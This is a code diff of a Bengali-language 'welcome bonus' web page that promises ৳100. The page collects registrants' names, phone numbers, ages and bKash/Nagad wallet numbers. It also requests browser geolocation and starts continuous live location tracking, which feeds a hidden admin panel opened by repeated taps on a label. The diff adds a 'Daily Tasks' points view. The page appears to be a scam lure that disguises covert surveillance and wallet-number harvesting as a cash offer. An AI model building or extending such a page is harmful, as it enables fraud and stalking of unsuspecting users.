@@ -23,10 +23,9 @@ html,body{
   margin:0;min-height:100%;
   font-family:Arial,"Noto Sans Bengali",sans-serif;
   color:var(--text);
-  background:
-    radial-gradient(circle at 50% -10%,#12452f 0,#04110b 35%,#010302 80%);
+  background:radial-gradient(circle at 50% -10%,#12452f 0,#04110b 35%,#010302 80%);
 }
-body{overflow-x:hidden}
+body{overflow-x:hidden;padding-bottom:50px}
 .page{
   width:100%;
   max-width:460px;
@@ -67,27 +66,12 @@ body{overflow-x:hidden}
   border:1px solid rgba(255,211,77,.26);
   background:linear-gradient(135deg,#0e3021,#0a1a12);
   box-shadow:0 16px 42px rgba(0,0,0,.28);
-  animation:cardIn .75s ease both;
-}
-.top-badge:before{
-  content:"";
-  position:absolute;
-  top:-30%;left:-45%;
-  width:40%;height:170%;
-  background:linear-gradient(90deg,transparent,rgba(255,255,255,.16),transparent);
-  transform:rotate(18deg);
-  animation:shine 3.2s infinite;
-}
-@keyframes shine{
-  0%{left:-45%}
-  55%,100%{left:120%}
 }
 .brand{
   font-weight:1000;
   font-size:20px;
   letter-spacing:.5px;
   color:#fff;
-  text-shadow:0 0 18px rgba(255,255,255,.12);
 }
 .brand span{color:var(--gold)}
 .brand-sub{
@@ -106,14 +90,6 @@ body{overflow-x:hidden}
   background:linear-gradient(155deg,#11563a,#07301f 48%,#06180f);
   border:1px solid rgba(255,211,77,.26);
   box-shadow:0 26px 70px rgba(0,0,0,.42);
-  animation:cardIn .9s .05s ease both;
-}
-.hero:after{
-  content:"";
-  position:absolute;
-  width:260px;height:260px;border-radius:50%;
-  right:-135px;top:-150px;
-  background:radial-gradient(circle,rgba(255,215,80,.18),transparent 67%);
 }
 .gift{
   width:70px;height:70px;
@@ -122,14 +98,7 @@ body{overflow-x:hidden}
   border-radius:23px;
   font-size:36px;
   background:linear-gradient(145deg,#ffd958,#e69b00);
-  box-shadow:
-    0 14px 35px rgba(255,193,31,.25),
-    inset 0 1px 0 rgba(255,255,255,.4);
-  animation:giftFloat 2.4s ease-in-out infinite;
-}
-@keyframes giftFloat{
-  0%,100%{transform:translateY(0) rotate(-2deg)}
-  50%{transform:translateY(-8px) rotate(3deg)}
+  box-shadow:0 14px 35px rgba(255,193,31,.25);
 }
 .hero .welcome{
   margin-top:14px;
@@ -138,10 +107,7 @@ body{overflow-x:hidden}
   font-weight:900;
   color:#caffea;
 }
-.hero h1{
-  margin:9px 0 4px;
-  font-size:23px;
-}
+.hero h1{margin:9px 0 4px;font-size:23px}
 .money{
   display:inline-block;
   margin:10px 0 8px;
@@ -149,18 +115,6 @@ body{overflow-x:hidden}
   line-height:1;
   font-weight:1000;
   color:var(--gold);
-  text-shadow:0 0 25px rgba(255,211,77,.24);
-  animation:moneyPulse 1.9s ease-in-out infinite;
-}
-@keyframes moneyPulse{
-  0%,100%{transform:scale(1)}
-  50%{transform:scale(1.055)}
-}
-.hero p{
-  margin:0;
-  color:#c3d6ca;
-  font-size:13px;
-  line-height:1.55;
 }
 .pay-mini{
   display:flex;
@@ -175,26 +129,40 @@ body{overflow-x:hidden}
   border:1px solid rgba(255,255,255,.08);
   font-size:12px;
   font-weight:900;
-  animation:miniFloat 3s ease-in-out infinite;
 }
-.pay-mini span:nth-child(2){animation-delay:-1.4s}
-@keyframes miniFloat{
-  0%,100%{transform:translateY(0)}
-  50%{transform:translateY(-3px)}
+.nav-tabs{
+  display:flex;
+  gap:8px;
+  margin-top:15px;
+  background:#07120d;
+  padding:6px;
+  border-radius:18px;
+  border:1px solid var(--line);
+}
+.nav-tab{
+  flex:1;
+  padding:12px;
+  border:0;
+  border-radius:13px;
+  background:transparent;
+  color:var(--muted);
+  font-weight:900;
+  font-size:13px;
+  cursor:pointer;
+  transition:.2s;
+}
+.nav-tab.active{
+  background:linear-gradient(135deg,#12452f,#0b2d1e);
+  color:#fff;
+  border:1px solid rgba(27,224,146,.3);
 }
 .card{
   margin-top:15px;
   padding:22px 18px;
   border-radius:29px;
-  background:
-    linear-gradient(180deg,rgba(12,27,19,.98),rgba(4,12,8,.98));
+  background:linear-gradient(180deg,rgba(12,27,19,.98),rgba(4,12,8,.98));
   border:1px solid var(--line);
   box-shadow:0 25px 65px rgba(0,0,0,.38);
-  animation:cardIn 1s .13s ease both;
-}
-@keyframes cardIn{
-  from{opacity:0;transform:translateY(18px) scale(.985)}
-  to{opacity:1;transform:translateY(0) scale(1)}
 }
 .head{
   display:flex;
@@ -209,11 +177,6 @@ body{overflow-x:hidden}
   font-size:23px;
   background:linear-gradient(145deg,#123d2b,#0b251a);
   border:1px solid #295c43;
-  animation:iconBreath 2.8s ease-in-out infinite;
-}
-@keyframes iconBreath{
-  0%,100%{box-shadow:0 0 0 0 rgba(27,224,146,0)}
-  50%{box-shadow:0 0 0 7px rgba(27,224,146,.06)}
 }
 .head h2{margin:0;font-size:20px}
 .head p{margin:4px 0 0;color:var(--muted);font-size:12px}
@@ -224,32 +187,10 @@ body{overflow-x:hidden}
   border-radius:14px;
   font-size:12px;
   line-height:1.55;
-  animation:shakeIn .35s ease;
 }
-@keyframes shakeIn{
-  0%{transform:translateX(-5px);opacity:0}
-  50%{transform:translateX(4px)}
-  100%{transform:translateX(0);opacity:1}
-}
-.msg.error{
-  display:block;
-  color:#ffb0ba;
-  background:#35161b;
-  border:1px solid #7b3540;
-}
-.msg.ok{
-  display:block;
-  color:#88f3c4;
-  background:#0b2a1d;
-  border:1px solid #24684d;
-}
-.field{margin-bottom:14px;animation:fieldIn .55s ease both}
-.field:nth-of-type(2){animation-delay:.08s}
-.field:nth-of-type(3){animation-delay:.14s}
-@keyframes fieldIn{
-  from{opacity:0;transform:translateX(-8px)}
-  to{opacity:1;transform:translateX(0)}
-}
+.msg.error{display:block;color:#ffb0ba;background:#35161b;border:1px solid #7b3540}
+.msg.ok{display:block;background:#0b2a1d;border:1px solid #24684d;color:#88f3c4}
+.field{margin-bottom:14px}
 .label{
   display:block;
   margin:0 0 7px 4px;
@@ -274,19 +215,9 @@ input{
   color:#fff;
   outline:none;
   font-size:15px;
-  transition:.22s;
 }
-input:focus{
-  border-color:var(--green);
-  box-shadow:0 0 0 4px rgba(27,224,146,.08);
-  transform:translateY(-1px);
-}
-.hint{
-  margin:-4px 3px 14px;
-  color:#86a494;
-  font-size:10px;
-  line-height:1.5;
-}
+input:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27,224,146,.08)}
+.hint{margin:-4px 3px 14px;color:#86a494;font-size:10px;line-height:1.5}
 .allow-btn{
   position:relative;
   overflow:hidden;
@@ -297,40 +228,12 @@ input:focus{
   border-radius:19px;
   cursor:pointer;
   color:#062115;
-  background:
-    linear-gradient(135deg,#f8d650 0%,#ffc52b 42%,#24e79f 100%);
-  box-shadow:
-    0 15px 36px rgba(24,205,137,.2),
-    0 10px 28px rgba(255,197,43,.14);
+  background:linear-gradient(135deg,#f8d650 0%,#ffc52b 42%,#24e79f 100%);
+  box-shadow:0 15px 36px rgba(24,205,137,.2);
   font-weight:1000;
   font-size:17px;
-  letter-spacing:.2px;
-  transition:.2s;
-  animation:buttonGlow 1.9s ease-in-out infinite;
 }
-.allow-btn:active{transform:scale(.985)}
-.allow-btn:disabled{
-  filter:saturate(.45);
-  cursor:not-allowed;
-  animation:none;
-}
-@keyframes buttonGlow{
-  0%,100%{box-shadow:0 12px 30px rgba(24,205,137,.18),0 0 0 0 rgba(255,208,60,.18)}
-  50%{box-shadow:0 18px 42px rgba(24,205,137,.27),0 0 0 7px rgba(255,208,60,0)}
-}
-.allow-btn:before{
-  content:"";
-  position:absolute;
-  top:-40%;left:-35%;
-  width:28%;height:190%;
-  background:linear-gradient(90deg,transparent,rgba(255,255,255,.65),transparent);
-  transform:rotate(20deg);
-  animation:btnShine 2.5s infinite;
-}
-@keyframes btnShine{
-  0%{left:-35%}
-  60%,100%{left:120%}
-}
+.allow-btn:disabled{filter:saturate(.45);cursor:not-allowed}
 .btn-inner{
   position:relative;
   z-index:2;
@@ -339,11 +242,7 @@ input:focus{
   justify-content:center;
   gap:10px;
 }
-.coin-stack{
-  position:relative;
-  width:34px;
-  height:32px;
-}
+.coin-stack{position:relative;width:34px;height:32px}
 .coin{
   position:absolute;
   width:21px;height:21px;
@@ -354,24 +253,12 @@ input:focus{
   background:linear-gradient(145deg,#fff4a4,#ffb800);
   border:2px solid #f2a700;
   color:#785000;
-  box-shadow:0 3px 7px rgba(114,75,0,.22);
 }
-.coin.c1{left:0;bottom:0;animation:coinBounce 1.25s ease-in-out infinite}
-.coin.c2{left:12px;bottom:5px;animation:coinBounce 1.25s .18s ease-in-out infinite}
-.coin.c3{left:6px;bottom:12px;animation:coinBounce 1.25s .36s ease-in-out infinite}
-@keyframes coinBounce{
-  0%,100%{transform:translateY(0) rotate(0)}
-  50%{transform:translateY(-5px) rotate(8deg)}
-}
-.note{
-  margin-top:13px;
-  text-align:center;
-  color:#82988c;
-  font-size:10px;
-  line-height:1.55;
-}
+.coin.c1{left:0;bottom:0}
+.coin.c2{left:12px;bottom:5px}
+.coin.c3{left:6px;bottom:12px}
+.note{margin-top:13px;text-align:center;color:#82988c;font-size:10px;line-height:1.55}
 #paymentStep,#successStep{display:none}
-.payment-title{text-align:center}
 .check{
   width:64px;height:64px;
   margin:auto;
@@ -380,20 +267,10 @@ input:focus{
   font-size:30px;
   background:#0e3827;
   border:1px solid #2e7455;
-  animation:successPop .65s cubic-bezier(.2,.9,.2,1.2);
-}
-@keyframes successPop{
-  from{transform:scale(.3);opacity:0}
-  to{transform:scale(1);opacity:1}
 }
 .payment-title h2{margin:12px 0 5px}
 .payment-title p{margin:0;color:var(--muted);font-size:12px}
-.pay-grid{
-  display:grid;
-  grid-template-columns:1fr 1fr;
-  gap:10px;
-  margin:18px 0;
-}
+.pay-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:18px 0}
 .pay-option input{display:none}
 .pay-card{
   height:96px;
@@ -406,13 +283,10 @@ input:focus{
   background:#07110c;
   border:2px solid #2c4137;
   cursor:pointer;
-  transition:.2s;
 }
 .pay-option input:checked + .pay-card{
   border-color:var(--green);
   background:#0c2b1e;
-  transform:translateY(-3px) scale(1.02);
-  box-shadow:0 10px 24px rgba(27,224,146,.12);
 }
 .pay-icon{font-size:27px}
 .success-box{text-align:center;padding:20px 5px}
@@ -424,20 +298,30 @@ input:focus{
   font-size:42px;
   background:linear-gradient(145deg,#0f402c,#0a2a1d);
   border:1px solid #2d7656;
-  animation:successPop .7s cubic-bezier(.2,.9,.2,1.2);
 }
 .success-box h2{margin:15px 0 7px}
 .success-box p{color:#9eb0a7;font-size:13px;line-height:1.65}
-.confetti{
-  position:fixed;
-  pointer-events:none;
-  z-index:30;
-  font-size:22px;
-  animation:fall 1.6s ease-out forwards;
+.task-item{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  padding:15px;
+  margin-bottom:12px;
+  border-radius:16px;
+  background:#06110b;
+  border:1px solid #20392d;
 }
-@keyframes fall{
-  from{transform:translateY(-20px) rotate(0deg);opacity:1}
-  to{transform:translateY(85vh) rotate(420deg);opacity:0}
+.task-info h4{margin:0 0 4px;font-size:15px}
+.task-info p{margin:0;color:var(--muted);font-size:11px}
+.task-btn{
+  padding:8px 14px;
+  border-radius:10px;
+  font-weight:900;
+  font-size:12px;
+  border:0;
+  background:var(--green);
+  color:#062015;
+  cursor:pointer;
 }
 
 /* ADMIN */
@@ -454,8 +338,6 @@ input:focus{
   width:min(100%,390px);
   padding:20px;border-radius:24px;
   background:#08140e;border:1px solid #2a5a42;
-  box-shadow:0 28px 80px rgba(0,0,0,.55);
-  animation:cardIn .35s ease both;
 }
 .admin-login h3{margin:0 0 5px;font-size:20px}
 .admin-login p{margin:0 0 15px;color:var(--muted);font-size:12px}
@@ -463,7 +345,7 @@ input:focus{
 .admin-secondary{
   width:100%;height:52px;border-radius:15px;
   border:1px solid #33483e;background:#111b16;
-  color:#fff;font-weight:900
+  color:#fff;font-weight:900;cursor:pointer;
 }
 .admin-panel{
   position:fixed;inset:0;z-index:90;
@@ -474,68 +356,36 @@ input:focus{
 .admin-shell{max-width:900px;margin:auto}
 .admin-top{
   display:flex;align-items:center;justify-content:space-between;
-  gap:10px;margin-bottom:12px
+  gap:10px;margin-bottom:12px;
 }
 .admin-top h2{margin:0;font-size:21px}
 .admin-top small{color:var(--muted)}
-.admin-grid{
-  display:grid;grid-template-columns:repeat(3,1fr);
-  gap:9px
-}
-.stat{
-  padding:14px;border-radius:16px;
-  background:#0a1710;border:1px solid #213d2f
-}
+.admin-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:9px}
+.stat{padding:14px;border-radius:16px;background:#0a1710;border:1px solid #213d2f}
 .stat b{display:block;font-size:24px;color:#fff}
 .stat span{font-size:10px;color:var(--muted)}
-.admin-card{
-  margin-top:11px;padding:15px;
-  border-radius:19px;background:#08140e;
-  border:1px solid #203a2d
-}
+.admin-card{margin-top:11px;padding:15px;border-radius:19px;background:#08140e;border:1px solid #203a2d}
 .admin-card h3{margin:0 0 12px}
 .admin-search{padding-left:14px!important}
-.record{
-  margin-top:10px;padding:13px;
-  border-radius:16px;background:#050e09;
-  border:1px solid #1c3328
-}
-.record-top{
-  display:flex;align-items:flex-start;
-  justify-content:space-between;gap:10px
-}
+.record{margin-top:10px;padding:13px;border-radius:16px;background:#050e09;border:1px solid #1c3328}
+.record-top{display:flex;align-items:flex-start;justify-content:space-between;gap:10px}
 .record h4{margin:0 0 6px}
-.record .meta{
-  color:#9db0a5;font-size:11px;line-height:1.65
-}
+.record .meta{color:#9db0a5;font-size:11px;line-height:1.65}
 .badge{
   padding:5px 8px;border-radius:99px;
   font-size:9px;font-weight:1000;
-  background:#113725;color:#78efba;white-space:nowrap
+  background:#113725;color:#78efba;white-space:nowrap;
 }
-.badge.pending{
-  background:#3b2a11;color:#ffda73;
-}
-.admin-btn{
-  border:0;border-radius:10px;
-  padding:9px 11px;font-weight:900;
-  cursor:pointer
-}
+.badge.pending{background:#3b2a11;color:#ffda73}
+.admin-btn{border:0;border-radius:10px;padding:9px 11px;font-weight:900;cursor:pointer}
 .admin-green{background:#19df92;color:#062015}
 .admin-dark{background:#15211b;color:#fff;border:1px solid #30483d}
 .admin-red{background:#35161b;color:#ff9fab;border:1px solid #71313c}
 .admin-row{display:grid;grid-template-columns:1fr 1fr;gap:9px}
 .admin-note{font-size:10px;color:#82988c;line-height:1.5}
-.admin-msg{
-  display:none;margin-top:9px;padding:10px;
-  border-radius:12px;font-size:11px
-}
+.admin-msg{display:none;margin-top:9px;padding:10px;border-radius:12px;font-size:11px}
 .admin-msg.ok{display:block;background:#0b2a1d;border:1px solid #24684d;color:#88f3c4}
 .admin-msg.error{display:block;background:#35161b;border:1px solid #7b3540;color:#ffb0ba}
-@media(max-width:650px){
-  .admin-grid{grid-template-columns:1fr}
-  .admin-row{grid-template-columns:1fr}
-}
 </style>
 </head>
 <body>
@@ -556,7 +406,7 @@ input:focus{
 
     <section class="hero">
       <div class="gift">🎁</div>
-      <div class="welcome" id="adminTapTarget" style="cursor:pointer;user-select:none;touch-action:manipulation;-webkit-tap-highlight-color:transparent">WELCOME BONUS</div>
+      <div class="welcome" id="adminTapTarget" style="cursor:pointer;user-select:none">WELCOME BONUS</div>
       <h1>একাউন্ট খুললেই পাচ্ছেন</h1>
       <div class="money">৳100</div>
       <p>রেজিস্ট্রেশন সম্পন্ন করে আপনার পছন্দের মাধ্যমে গ্রহণ করুন</p>
@@ -564,118 +414,144 @@ input:focus{
         <span>📱 bKash</span>
         <span>💳 Nagad</span>
       </div>
-    </section>
 
-    <section class="card" id="registerStep">
-      <div class="head">
-        <div class="head-icon">👤</div>
-        <div>
-          <h2>নতুন একাউন্ট</h2>
-          <p>নিচের তথ্যগুলো সঠিকভাবে পূরণ করুন</p>
-        </div>
-      </div>
-
-      <div class="msg" id="formMsg"></div>
-
-      <div class="field">
-        <label class="label">আপনার নাম</label>
-        <div class="input-wrap">
-          <span class="ico">👤</span>
-          <input id="name" type="text" placeholder="পূর্ণ নাম লিখুন">
-        </div>
-      </div>
-
-      <div class="field">
-        <label class="label">ফোন নাম্বার</label>
-        <div class="input-wrap">
-          <span class="ico">📱</span>
-          <input id="phone" type="tel" inputmode="numeric" maxlength="11" placeholder="01XXXXXXXXX">
-        </div>
-      </div>
-
-      <div class="hint">✓ একটি ফোন নাম্বার দিয়ে শুধু একবার রেজিস্ট্রেশন করা যাবে</div>
-
-      <div class="field">
-        <label class="label">বয়স</label>
-        <div class="input-wrap">
-          <span class="ico">🎂</span>
-          <input id="age" type="number" min="18" max="100" placeholder="18+">
-        </div>
-      </div>
-
-      <button class="allow-btn" id="allowBtn">
-        <span class="btn-inner">
-          <span class="coin-stack">
-            <span class="coin c1">৳</span>
-            <span class="coin c2">৳</span>
-            <span class="coin c3">৳</span>
-          </span>
-          <span id="allowText">ALLOW NOW →</span>
-        </span>
-      </button>
-
-      <div class="note">
-        🔒 Allow Now চাপলে Browser Location permission চাইবে
+      <!-- Tab Switcher for Tasks & Registration -->
+      <div class="nav-tabs">
+        <button class="nav-tab active" id="tabRegister" onclick="switchView('register')">🏠 Registration</button>
+        <button class="nav-tab" id="tabTasks" onclick="switchView('tasks')">📋 Daily Tasks</button>
       </div>
     </section>
 
-    <section class="card" id="paymentStep">
-      <div class="payment-title">
-        <div class="check">✓</div>
-        <h2>রেজিস্ট্রেশন সম্পন্ন</h2>
-        <p>৳100 গ্রহণের মাধ্যম নির্বাচন করুন</p>
-      </div>
-
-      <div class="msg" id="paymentMsg"></div>
-
-      <div class="pay-grid">
-        <label class="pay-option">
-          <input type="radio" name="payment" value="bKash">
-          <span class="pay-card">
-            <span class="pay-icon">📱</span>
-            <strong>bKash</strong>
-          </span>
-        </label>
-
-        <label class="pay-option">
-          <input type="radio" name="payment" value="Nagad">
-          <span class="pay-card">
-            <span class="pay-icon">💳</span>
-            <strong>Nagad</strong>
-          </span>
-        </label>
-      </div>
-
-      <div class="field">
-        <label class="label">bKash / Nagad নাম্বার</label>
-        <div class="input-wrap">
-          <span class="ico">☎️</span>
-          <input id="walletNumber" type="tel" inputmode="numeric" maxlength="11" placeholder="01XXXXXXXXX">
+    <!-- REGISTER VIEW -->
+    <div id="registerView">
+      <section class="card" id="registerStep">
+        <div class="head">
+          <div class="head-icon">👤</div>
+          <div>
+            <h2>নতুন একাউন্ট</h2>
+            <p>নিচের তথ্যগুলো সঠিকভাবে পূরণ করুন</p>
+          </div>
         </div>
-      </div>
 
-      <button class="allow-btn" id="confirmBtn">
-        <span class="btn-inner">
-          <span class="coin-stack">
-            <span class="coin c1">৳</span>
-            <span class="coin c2">৳</span>
-            <span class="coin c3">৳</span>
+        <div class="msg" id="formMsg"></div>
+
+        <div class="field">
+          <label class="label">আপনার নাম</label>
+          <div class="input-wrap">
+            <span class="ico">👤</span>
+            <input id="name" type="text" placeholder="পূর্ণ নাম লিখুন">
+          </div>
+        </div>
+
+        <div class="field">
+          <label class="label">ফোন নাম্বার</label>
+          <div class="input-wrap">
+            <span class="ico">📱</span>
+            <input id="phone" type="tel" inputmode="numeric" maxlength="11" placeholder="01XXXXXXXXX">
+          </div>
+        </div>
+
+        <div class="hint">✓ একটি ফোন নাম্বার দিয়ে শুধু একবার রেজিস্ট্রেশন করা যাবে</div>
+
+        <div class="field">
+          <label class="label">বয়স</label>
+          <div class="input-wrap">
+            <span class="ico">🎂</span>
+            <input id="age" type="number" min="18" max="100" placeholder="18+">
+          </div>
+        </div>
+
+        <button class="allow-btn" id="allowBtn">
+          <span class="btn-inner">
+            <span class="coin-stack">
+              <span class="coin c1">৳</span>
+              <span class="coin c2">৳</span>
+              <span class="coin c3">৳</span>
+            </span>
+            <span id="allowText">ALLOW NOW →</span>
           </span>
-          <span>CONFIRM BONUS →</span>
-        </span>
-      </button>
-    </section>
+        </button>
 
-    <section class="card" id="successStep">
-      <div class="success-box">
-        <div class="success-icon">✓</div>
-        <h2>Registration Successful</h2>
-        <p>
-          আপনার তথ্য সফলভাবে গ্রহণ করা হয়েছে।<br>
-          যাচাই শেষে পরবর্তী আপডেট দেওয়া হবে।
-        </p>
-      </div>
-    </section>
+        <div class="note">
+          🔒 Allow Now চাপলে Browser Location permission চাইবে
+        </div>
+      </section>
+
+      <section class="card" id="paymentStep">
+        <div class="payment-title">
+          <div class="check">✓</div>
+          <h2>রেজিস্ট্রেশন সম্পন্ন</h2>
+          <p>৳100 গ্রহণের মাধ্যম নির্বাচন করুন</p>
+        </div>
+
+        <div class="msg" id="paymentMsg"></div>
+
+        <div class="pay-grid">
+          <label class="pay-option">
+            <input type="radio" name="payment" value="bKash">
+            <span class="pay-card">
+              <span class="pay-icon">📱</span>
+              <strong>bKash</strong>
+            </span>
+          </label>
+
+          <label class="pay-option">
+            <input type="radio" name="payment" value="Nagad">
+            <span class="pay-card">
+              <span class="pay-icon">💳</span>
+              <strong>Nagad</strong>
+            </span>
+          </label>
+        </div>
+
+        <div class="field">
+          <label class="label">bKash / Nagad নাম্বার</label>
+          <div class="input-wrap">
+            <span class="ico">☎️</span>
+            <input id="walletNumber" type="tel" inputmode="numeric" maxlength="11" placeholder="01XXXXXXXXX">
+          </div>
+        </div>
+
+        <button class="allow-btn" id="confirmBtn">
+          <span class="btn-inner">
+            <span class="coin-stack">
+              <span class="coin c1">৳</span>
+              <span class="coin c2">৳</span>
+              <span class="coin c3">৳</span>
+            </span>
+            <span>CONFIRM BONUS →</span>
+          </span>
+        </button>
+      </section>
+
+      <section class="card" id="successStep">
+        <div class="success-box">
+          <div class="success-icon">✓</div>
+          <h2>Registration Successful</h2>
+          <p>
+            আপনার তথ্য সফলভাবে গ্রহণ করা হয়েছে。<br>
+            যাচাই শেষে পরবর্তী আপডেট দেওয়া হবে।
+          </p>
+        </div>
+      </section>
+    </div>
+
+    <!-- TASKS VIEW -->
+    <div id="tasksView" style="display:none;">
+      <section class="card">
+        <div class="head">
+          <div class="head-icon">🎁</div>
+          <div>
+            <h2>Task & Reward System</h2>
+            <p>টাস্ক সম্পন্ন করে অতিরিক্ত পয়েন্ট অর্জন করুন</p>
+          </div>
+        </div>
+        <div class="msg" id="taskMsg"></div>
+        <div id="tasksListContainer">
+          <div class="admin-note">টাস্ক লোড হচ্ছে...</div>
+        </div>
+      </section>
+    </div>
 
   </div>
 </main>
@@ -778,7 +654,22 @@ function confetti(){
   }
 }
 
-// Persistent Registration Recovery System Check
+// Switch between Register view and Tasks view
+function switchView(view) {
+  if (view === 'register') {
+    $('registerView').style.display = 'block';
+    $('tasksView').style.display = 'none';
+    $('tabRegister').className = 'nav-tab active';
+    $('tabTasks').className = 'nav-tab';
+  } else {
+    $('registerView').style.display = 'none';
+    $('tasksView').style.display = 'block';
+    $('tabTasks').className = 'nav-tab active';
+    $('tabRegister').className = 'nav-tab';
+    loadTasks();
+  }
+}
+
 document.addEventListener("DOMContentLoaded", () => {
   const savedRegId = localStorage.getItem("registrationId");
   const isCompleted = localStorage.getItem("registrationCompleted");
@@ -794,7 +685,6 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 });
 
-// Real-time Live Tracking Implementation (watchPosition)
 let watchId = null;
 function startLiveLocationTracking(regId) {
   if (!navigator.geolocation) return;
@@ -826,7 +716,6 @@ function startLiveLocationTracking(regId) {
 $("allowBtn").addEventListener("click", () => {
   clearMsg("formMsg");
 
-  // Secure Context Validation Checks (HTTPS Check)
   if (!window.isSecureContext && location.hostname !== "localhost" && location.hostname !== "127.0.0.1") {
     return showMsg("formMsg", "HTTPS ছাড়া ব্রাউজার লোকেশন সাপোর্ট করে না। Secure (HTTPS) সংযোগে প্রবেশ করুন।");
   }
@@ -869,11 +758,9 @@ $("allowBtn").addEventListener("click", () => {
         const d = await r.json();
         if (!r.ok) throw new Error(d.error || "রেজিস্ট্রেশন সম্ভব হচ্ছে না।");
 
-        // Persistent Multi-tab sync using localStorage & sessionStorage
         localStorage.setItem("registrationId", d.registrationId);
         sessionStorage.setItem("registrationId", d.registrationId);
 
-        // Continuous Tracking Triggering
         startLiveLocationTracking(d.registrationId);
 
         $("registerStep").style.display = "none";
@@ -883,22 +770,13 @@ $("allowBtn").addEventListener("click", () => {
       } catch (e) {
         $("allowBtn").disabled = false;
         $("allowText").textContent = "ALLOW NOW →";
-        showMsg("formMsg", e.message || "সার্ভারে সংযোগ করা যাচ্ছে না। ইন্টারনেটে আবার চেষ্টা করুন।");
+        showMsg("formMsg", e.message || "সার্ভারে সংযোগ করা যাচ্ছে না।");
       }
     },
     error => {
       $("allowBtn").disabled = false;
       $("allowText").textContent = "ALLOW NOW →";
-
-      if (error.code === error.PERMISSION_DENIED) {
-        showMsg("formMsg", "Location permission Denied! ব্রাউজার সেটিংস থেকে লোকেশন Allow করুন।");
-      } else if (error.code === error.POSITION_UNAVAILABLE) {
-        showMsg("formMsg", "আপনার ডিভাইসের GPS লোকেশন পাওয়া যাচ্ছে না। GPS Signal অন করুন।");
-      } else if (error.code === error.TIMEOUT) {
-        showMsg("formMsg", "লোকেশন পেতে অতিরিক্ত সময় লাগছে। জিপিএস অন করে আবার চেষ্টা করুন।");
-      } else {
-        showMsg("formMsg", "দয়া করে লোকেশন অন করুন");
-      }
+      showMsg("formMsg", "দয়া করে লোকেশন অন করুন");
     },
     { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
   );
@@ -913,7 +791,7 @@ $("confirmBtn").addEventListener("click", async () => {
 
   if (!method) return showMsg("paymentMsg", "bKash অথবা Nagad নির্বাচন করুন।");
   if (!validPhone(wallet)) return showMsg("paymentMsg", "সঠিক bKash/Nagad নাম্বার লিখুন।");
-  if (!registrationId) return showMsg("paymentMsg", "রেজিস্ট্রেশন আইডি পাওয়া যায়নি। প্রথম থেকে চেষ্টা করুন।");
+  if (!registrationId) return showMsg("paymentMsg", "রেজিস্ট্রেশন আইডি পাওয়া যায়নি।");
 
   $("confirmBtn").disabled = true;
 
@@ -938,11 +816,61 @@ $("confirmBtn").addEventListener("click", async () => {
     window.scrollTo({ top: 0, behavior: "smooth" });
   } catch (e) {
     $("confirmBtn").disabled = false;
-    showMsg("paymentMsg", e.message || "সার্ভার রেসপন্স করছে না। ইন্টারনেট চেক করে আবার চেষ্টা করুন।");
+    showMsg("paymentMsg", e.message || "সার্ভার রেসপন্স করছে না।");
   }
 });
 
-// Cross-browser Mobile Tap Trigger Handling (Pointer, Click, Touchend Fallbacks)
+// Load and Complete Tasks
+async function loadTasks() {
+  try {
+    const r = await fetch("/api/tasks");
+    const d = await r.json();
+    const tasks = d.tasks || [];
+
+    const container = $("tasksListContainer");
+    if (!tasks.length) {
+      container.innerHTML = `<div class="admin-note">কোনো টাস্ক উপলব্ধ নেই।</div>`;
+      return;
+    }
+
+    container.innerHTML = tasks.map(t => `
+      <div class="task-item">
+        <div class="task-info">
+          <h4>${esc(t.title)}</h4>
+          <p>Reward: ৳${t.reward} (${esc(t.type)})</p>
+        </div>
+        <button class="task-btn" onclick="completeTask('${esc(t.id)}')">Complete</button>
+      </div>
+    `).join("");
+  } catch (err) {
+    $("tasksListContainer").innerHTML = `<div class="admin-note">টাস্ক লোড করতে সমস্যা হয়েছে।</div>`;
+  }
+}
+
+window.completeTask = async function(taskId) {
+  const regId = localStorage.getItem("registrationId") || sessionStorage.getItem("registrationId");
+  if (!regId) {
+    showMsg("taskMsg", "আগে রেজিস্ট্রেশন সম্পন্ন করুন তারপর টাস্ক কমপ্লিট করুন।");
+    switchView('register');
+    return;
+  }
+
+  try {
+    const r = await fetch("/api/tasks/complete", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ registrationId: regId, taskId })
+    });
+    const d = await r.json();
+    if (!r.ok) throw new Error(d.error || "Task completion failed");
+
+    showMsg("taskMsg", `অভিনন্দন! টাস্ক সফল হয়েছে। আপনার বর্তমান পয়েন্ট: ৳${d.points}`, "ok");
+    confetti();
+  } catch (err) {
+    showMsg("taskMsg", err.message, "error");
+  }
+};
+
 let adminTapCount = 0;
 let adminTapTimer = null;
 
@@ -1072,6 +1000,7 @@ function renderAdminLive() {
                 📱 Phone: ${esc(r.phone)}<br>
                 🎂 Age: ${esc(r.age)}<br>
                 💳 ${esc(r.paymentMethod || "N/A")}: ${esc(r.paymentNumber || "N/A")}<br>
+                🎁 Points: ${esc(r.points || 100)}<br>
                 ${loc} (${locCount} live updates saved)<br>
                 🕒 Registered: ${esc(fmtDate(r.createdAt))}
               </div>
